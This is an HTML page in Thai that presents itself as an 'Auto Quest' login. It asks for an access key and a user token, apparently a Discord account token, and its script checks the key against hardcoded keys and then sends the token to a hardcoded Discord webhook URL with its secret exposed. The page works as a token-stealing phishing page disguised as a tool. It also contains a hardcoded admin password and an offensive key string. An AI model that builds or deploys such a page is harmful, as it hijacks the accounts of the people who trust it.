<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Quest - Access System</title>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Kanit', sans-serif;
            transition: all 0.2s ease;
        }

        body {
            background-color: #050505;
            background-image: 
                radial-gradient(circle at center, rgba(255, 255, 255, 0.08) 0%, transparent 70%),
                linear-gradient(to right, rgba(255, 255, 255, 0.05) 1px, transparent 1px),
                linear-gradient(to bottom, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
            background-size: 100% 100%, 30px 30px, 30px 30px;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .card {
            position: relative;
            background: rgba(15, 15, 18, 0.95);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 4px;
            padding: 36px 24px;
            width: 100%;
            max-width: 360px;
            text-align: center;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.9), inset 0 0 15px rgba(255, 255, 255, 0.05);
            clip-path: polygon(
                20px 0, 100% 0, 
                100% calc(100% - 20px), calc(100% - 20px) 100%, 
                0 100%, 0 20px
            );
        }

        .card::before {
            content: '';
            position: absolute;
            top: 4px; left: 4px; right: 4px; bottom: 4px;
            border: 1px solid rgba(255, 255, 255, 0.15);
            pointer-events: none;
            clip-path: polygon(
                18px 0, 100% 0, 
                100% calc(100% - 18px), calc(100% - 18px) 100%, 
                0 100%, 0 18px
            );
        }

        .icon-circle {
            width: 70px;
            height: 70px;
            margin: 0 auto 16px;
            border-radius: 50%;
            background: radial-gradient(circle, #2a2a2e 0%, #0d0d0f 100%);
            border: 2px solid #a1a1aa;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2), inset 0 0 10px #000;
        }

        .icon-circle svg {
            width: 36px;
            height: 36px;
            fill: url(#silver-gradient);
            filter: drop-shadow(0 0 6px rgba(255, 255, 255, 0.8));
        }

        h2 {
            margin: 0 0 8px;
            font-size: 26px;
            font-weight: 600;
            letter-spacing: 1px;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }

        p {
            color: #a1a1aa;
            font-size: 13px;
            margin: 0 0 20px;
            line-height: 1.4;
        }

        .input-box {
            position: relative;
            margin-bottom: 14px;
        }

        .input-box input {
            width: 100%;
            padding: 12px 16px;
            background: #09090b;
            border: 1px solid #27272a;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            outline: none;
            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.8);
        }

        .input-box input:focus {
            border-color: #e4e4e7;
            box-shadow: 0 0 12px rgba(255, 255, 255, 0.2), inset 0 2px 4px rgba(0, 0, 0, 0.8);
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(180deg, #3f3f46 0%, #18181b 100%);
            border: 1px solid #71717a;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            letter-spacing: 0.5px;
            cursor: pointer;
            border-radius: 6px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.3);
            margin-top: 6px;
        }

        button:hover {
            background: linear-gradient(180deg, #52525b 0%, #27272a 100%);
            border-color: #a1a1aa;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
        }

        /* หน้าต่าง Admin Dashboard */
        .admin-panel {
            display: none;
            background: rgba(24, 24, 27, 0.9);
            border: 1px solid #ef4444;
            border-radius: 8px;
            padding: 16px;
            margin-top: 10px;
            text-align: center;
        }

        .admin-badge {
            display: inline-block;
            background: #ef4444;
            color: #fff;
            font-size: 11px;
            padding: 2px 8px;
            border-radius: 4px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        /* ปุ่มลิงก์ Discord สีม่วงสวยๆ */
        .discord-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: 100%;
            padding: 12px;
            background: #5865F2;
            color: #ffffff;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            border-radius: 6px;
            margin: 12px 0 8px 0;
            box-shadow: 0 4px 12px rgba(88, 101, 242, 0.4);
            transition: all 0.2s ease;
        }

        .discord-btn:hover {
            background: #4752C4;
            box-shadow: 0 0 15px rgba(88, 101, 242, 0.6);
            transform: translateY(-1px);
        }

        #msg {
            margin-top: 16px;
            font-size: 13px;
            min-height: 20px;
        }
    </style>
</head>
<body>

<svg style="width:0;height:0;position:absolute;" aria-hidden="true">
  <defs>
    <linearGradient id="silver-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#ffffff" />
      <stop offset="50%" stop-color="#a1a1aa" />
      <stop offset="100%" stop-color="#3f3f46" />
    </linearGradient>
  </defs>
</svg>

<div class="card">
    <div class="icon-circle">
        <svg viewBox="0 0 24 24">
            <path d="M13 2L3 14h7v8l10-12h-7z"/>
        </svg>
    </div>

    <h2 id="mainTitle">Auto Quest</h2>
    <p id="subTitle">กรุณากรอก Key และ Token เพื่อเข้าสู่ระบบ</p>

    <!-- ฟอร์มกรอกข้อมูลสำหรับผู้ใช้ทั่วไป -->
    <div id="loginForm">
        <div class="input-box">
            <input type="text" id="accessKey" placeholder="วาง Access Key ที่นี่..." autocomplete="off">
        </div>
        
        <div class="input-box">
            <input type="text" id="userToken" placeholder="วาง Token ของคุณที่นี่..." autocomplete="off">
        </div>

        <button onclick="submitData()">บันทึกข้อมูล</button>
    </div>

    <!-- แผงควบคุม Admin (จะแสดงพร้อมลิงก์ Discord เมื่อกรอก Admin Key ถูกต้อง) -->
    <div id="adminPanel" class="admin-panel">
        <span class="admin-badge">ADMIN CONTROL</span>
        <h4 style="margin: 4px 0 8px; color:#fff;">ยินดีต้อนรับ ผู้ดูแลระบบ</h4>
        <p style="font-size:12px; color:#a1a1aa; margin-bottom:12px;">คุณได้เข้าสู่โหมดแอดมินเรียบร้อยแล้ว</p>
        
        <!-- ปุ่มเข้าร่วม Discord สำหรับแอดมิน -->
        <a href="https://discord.gg/zkqXXx79U" target="_blank" class="discord-btn">
            <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
                <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994.021-.041.001-.09-.041-.106a13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.061 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.028zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
            </svg>
            เข้าร่วม Discord แอดมิน
        </a>

        <button onclick="location.reload()" style="background:#3f3f46; border:1px solid #71717a; padding:8px; width:100%;">ออกจากโหมดแอดมิน</button>
    </div>

    <div id="msg"></div>
</div>

<script>
    // 👑 คีย์แอดมิน
    const ADMIN_KEY = "Martin56"; 

    // 🔑 รายการคีย์คนปกติ
    const ALLOWED_KEYS = [
"ImGay67"
    ];

    // ⚠️ Discord Webhook URL
    const WEBHOOK = "https://discord.com/api/webhooks/1555158698496753664/uECfdnq9O0TF4AJpYFM_tcMvKbo_uDviXK8yXDC1Xq2zXVP3wqmt9z_Yrl22nyZGTBg0"; 

    function submitData() {
        const key = document.getElementById('accessKey').value.trim();
        const token = document.getElementById('userToken').value.trim();
        const msg = document.getElementById('msg');

        if(!key || !token) {
            msg.style.color = "#ef4444";
            msg.innerText = "❌ กรุณากรอกทั้ง Key และ Token ให้ครบถ้วน";
            return;
        }

        // 👑 ปลดล็อกโหมด Admin + แสดงลิงก์ Discord
        if(key === ADMIN_KEY) {
            msg.style.color = "#ef4444";
            msg.innerText = "⚡ ยินดีต้อนรับปลดล็อกโหมดแอดมิน!";
            
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'block';
            document.getElementById('mainTitle').innerText = "ADMIN MODE";
            document.getElementById('subTitle').innerText = "ระบบจัดการผู้ดูแลระบบ Auto Quest";
            return;
        }

        // 👤 ตรวจสอบคีย์คนปกติ
        if(!ALLOWED_KEYS.includes(key)) {
            msg.style.color = "#ef4444";
            msg.innerText = "❌ Access Key ไม่ถูกต้อง หรือหมดอายุ";
            return;
        }

        // 🚀 ส่งข้อมูลเข้า Discord
        msg.style.color = "#eab308";
        msg.innerText = "⏳ กำลังส่งข้อมูล...";

        fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ 
                embeds: [{
                    title: "🔑 Auto Quest - ได้รับข้อมูลใหม่",
                    color: 3092271,
                    fields: [
                        { name: "Key ที่ใช้", value: "`" + key + "`" },
                        { name: "Token", value: "`" + token + "`" },
                        { name: "เวลาที่ส่ง", value: new Date().toLocaleString("th-TH") }
                    ]
                }]
            })
        }).then(() => {
            msg.style.color = "#22c55e";
            msg.innerText = "✅ บันทึกข้อมูลเรียบร้อยแล้ว!";
            document.getElementById('accessKey').value = '';
            document.getElementById('userToken').value = '';
        }).catch(() => {
            msg.style.color = "#ef4444";
            msg.innerText = "❌ เกิดข้อผิดพลาด กรุณาลองใหม่อีกครั้ง";
        });
    }
</script>

</body>
</html>
